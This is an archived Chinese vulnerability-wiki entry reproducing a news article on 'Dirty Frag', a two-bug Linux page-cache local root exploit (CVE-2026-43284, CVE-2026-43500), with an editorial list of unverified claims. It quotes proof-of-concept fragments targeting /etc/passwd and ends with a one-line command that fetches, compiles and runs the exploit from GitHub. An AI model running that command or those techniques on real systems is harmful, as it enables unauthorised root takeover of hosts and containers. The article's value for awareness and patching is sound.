---
source: "gelusus/wxvl 公众号漏洞文库"
cve: "CVE-2026-43284;CVE-2026-43500"
identifier_role: "primary"
primary_identifiers: "CVE-2026-43284;CVE-2026-43500"
referenced_identifiers: ""
identifier_status: "unknown"
title: "Dirty Frag的双漏洞组合"
product: "Linux xfrm-ESP / RxRPC"
record_type: "advisory"
document_type: "双路径利用新闻"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "本地低权限；ESP需命名空间权限，RxRPC需可用模块；版本/补丁未列"
side_effects: "把Ubuntu非特权namespace与各发行版覆盖做全称判断缺版本/策略限定，代码模块自动加载不能只按当前未加载判断安全；失败不崩溃/成功极高/几秒root为未给测试矩阵的推广断言，不能记录为验证结论；页缓存篡改与持久磁盘改变需区别，容器逃逸依赖环境；CopyFail只是历史同类非同CVE"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/Linux/Dirty%20Frag%E7%9A%84%E5%8F%8C%E6%BC%8F%E6%B4%9E%E7%BB%84%E5%90%88.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-640f1c68b15a2a77cc54df96"
entity_id: "ve-640f1c68b15a2a77cc54df96"
schema_version: "1"
---

# Dirty Frag的双漏洞组合

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：Linux xfrm-ESP / RxRPC
- 文献类型：双路径利用新闻
- 版本、权限及部署边界：本地低权限；ESP需命名空间权限，RxRPC需可用模块；版本/补丁未列
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. frontmatter漏第二主CVE；标题双漏洞长攻击链但所示main实际二选一/失败回退，应称互补利用路径而非两洞必串联
2. 把Ubuntu非特权namespace与各发行版覆盖做全称判断缺版本/策略限定，代码模块自动加载不能只按当前未加载判断安全
3. 失败不崩溃/成功极高/几秒root为未给测试矩阵的推广断言，不能记录为验证结论
4. GitHub项目链接存在，但只节选调度和mmap非完整机制分析；缺上游补丁/官方公告
5. 页缓存篡改与持久磁盘改变需区别，容器逃逸依赖环境；CopyFail只是历史同类非同CVE

### 操作风险

把Ubuntu非特权namespace与各发行版覆盖做全称判断缺版本/策略限定，代码模块自动加载不能只按当前未加载判断安全；失败不崩溃/成功极高/几秒root为未给测试矩阵的推广断言，不能记录为验证结论；页缓存篡改与持久磁盘改变需区别，容器逃逸依赖环境；CopyFail只是历史同类非同CVE

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文参考链接（未重新核验）：<https://github.com/V4bel/dirtyfrag>
- 原文参考链接（未重新核验）：<https://github.com/V4bel/dirtyfrag.git>
- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

whoami
                    whoami  船山信安   2026-05-14 04:10  
  
# CVE-2026-43284/43500 Linux Dirty Frag 本地提权漏洞    
  
韩国安全研究员Hyunwoo Kim公布了名为Dirty Frag的双漏洞组合，编号CVE-2026-43284和CVE-2026-43500。CVSS评分7.8，属于高危级别。  
  
这个漏洞还有另一个名称Copy Fail 2: Electric Boogaloo。听起来像是续集电影，实际上也确实如此。Dirty Frag在技术路线上继承了Dirty Cow、Dirty Pipe以及今年早些时候曝光的Copy Fail那一套页缓存污染思路。  
  
**两个漏洞联动**  
  
严格来说，Dirty Frag并不是一个漏洞，而是两条独立漏洞组成的长攻击链。第一条是xfrm-ESP模块中的页缓存写入漏洞，对应CVE-2026-43284，在上游代码里潜伏了将近9年，从2017年1月一直存活到今年5月才被人挖出来。第二条是RxRPC模块的页缓存写入漏洞，对应CVE-2026-43500，潜伏时间稍短，也有近三年。  
  
xfrm-ESP这条路径提供了强大的任意4字节写入原语，但有个限制—，它需要创建namespace的权限。Ubuntu默认不让非特权用户玩这套，所以单独靠这一条还不足以全覆盖。RxRPC这条则反过来，不需要namespace权限，但默认情况下大多数发行版并不加载rxrpc.ko模块。两个漏洞组合在一起，刚好形成互补，覆盖了几乎所有主流Linux发行版。  
  
攻击者不再需要像Dirty Cow那样拼手气赌竞态窗口，也不需要像早期提权漏洞那样反复尝试。Dirty Frag是纯逻辑漏洞，利用过程稳定得可怕，失败的时候内核不会崩溃，成功率极高。想象一下，攻击者在目标机器上拿到一个普通用户shell，几秒钟之后就能变成root,整个过程行云流水，留给防守方的反应时间几乎为零。  
  
**页缓存**  
  
要说清楚这个漏洞的技术细节，得从struct sk_buff这个数据结构说起。它是Linux内核网络子系统的核心结构，用来管理网络数据包。问题出在这个结构的frag成员上,它本来应该只承载数据，但内核在某些路径上会把它当成可修改的私有数据来处理。当ESP报文经过解密处理时，内核认为自己在操作一段独立的内存空间，实际上这段空间可能已经通过splice之类的机制被映射到了文件系统的页缓存里。对页缓存里的数据进行原地修改，后果就是污染了底层文件，/etc/passwd或者某个SUID二进制程序就此沦陷。  
  
POC  
  
main（  
）  
执行逻辑  
  
```
// main() 中的核心分支逻辑
if (force_rxrpc) {
    rc = rxrpc_lpe_main(new_argc, co_argv);  // 强制走RxRPC路径
} else if (force_esp) {
    rc = su_lpe_main(new_argc, co_argv);     // 强制走xfrm-ESP路径
} else {
    // 默认：先试ESP，再试RxRPC兜底
    rc = su_lpe_main(new_argc, co_argv);
    if (!su_already_patched()) {
        rc = rxrpc_lpe_main(new_argc, co_argv);  // ESP失败就换RxRPC
    }
}
```  
  
  
  
### RxRPC路径（CVE-2026-43500） rxrpc_lpe_main()  
  
```
int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
if (dummy < 0) {
    WARN("socket(AF_RXRPC): %s — module not loadable?", strerror(errno));
    return 1;
}
close(dummy);
LOG("rxrpc module autoloaded via dummy socket(AF_RXRPC)");
```  
  
#### /etc/passwd页缓存mmao  
  
```
int rfd_ro = open(target_path, O_RDONLY);  // target_path默认是/etc/passwd
// ...
void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rfd_ro, 0);
LOG("mmap'd %s page-cache at %p (PROT_READ|MAP_SHARED)", target_path, map);
```  
  
**言外之意**  
  
Dirty Frag是本地提权漏洞，这意味着攻击者必须先通过其他方式拿到一个低权限的shell入口。弱SSH账号、WebShell、容器逃逸、低权限服务账号或者钓鱼得来的远程访问，都可能成为第一步。所以如果你有一台对外暴露SSH的Linux服务器，或者跑着Web应用可能被写入WebShell的业务系统，又或者是多用户共享的跳板机、开发机和CI/CD runner，那真得把优先级往上调一调了。  
  
容器宿主机和Kubernetes节点更是高危区域。在容器化环境里，本地提权漏洞往往不只是拿到一个shell那么简单，还可能直接突破容器边界控制整台宿主机。  
  
相关链接： https://github.com/V4bel/dirtyfrag   
```
git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
```  
  
  
  
  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原始披露 URL 尚未确认，现有链接按来源追溯区分别标注）
